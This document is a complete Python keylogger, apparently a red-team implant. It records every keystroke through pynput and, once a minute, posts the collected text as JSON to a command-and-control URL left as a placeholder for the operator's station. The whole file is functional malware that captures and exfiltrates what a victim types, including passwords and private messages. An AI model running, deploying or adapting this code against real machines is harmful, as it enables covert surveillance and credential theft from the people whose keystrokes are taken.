import requests
import time
from pynput import keyboard

# Configuration
C2_URL = 'x.x.x.x/keystrokes'#Change to the redteams ops_station you want to beacon back to.
INTERVAL = 60  # Beacon interval in seconds

keystrokes = []

def on_press(key):
    try:
        keystrokes.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            keystrokes.append(' ')
        elif key == keyboard.Key.enter:
            keystrokes.append('\n')
        else:
            keystrokes.append(f'[{key.name}]')

def beacon():
    global keystrokes

    while True:
        if keystrokes:
            payload = {
                'keystrokes': ''.join(keystrokes)
            }
            send_payload(payload)
            keystrokes = []

        time.sleep(INTERVAL)

def send_payload(payload):
    try:
        response = requests.post(C2_URL, json=payload)
        if response.status_code == 200:
            print("Keystrokes sent successfully.")
        else:
            print(f"Failed to send keystrokes. Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending keystrokes: {e}")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    beacon()
